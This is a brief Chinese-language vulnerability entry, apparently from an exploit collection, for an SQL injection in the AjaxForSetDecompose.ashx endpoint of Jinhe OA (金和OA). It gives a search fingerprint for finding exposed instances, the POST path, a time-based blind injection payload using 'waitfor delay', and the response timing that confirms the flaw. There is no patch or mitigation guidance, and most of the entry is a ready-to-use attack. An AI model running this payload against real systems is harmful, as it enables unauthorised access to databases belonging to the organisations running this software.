# 金和OAAjaxForSetDecompose.ashx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx HTTP/1.1`

**Payload**
```
strType=getDetpCollect&strYear=1'waitfor delay '0:0:4'--
```
- **响应特征**：200 响应时间>=4s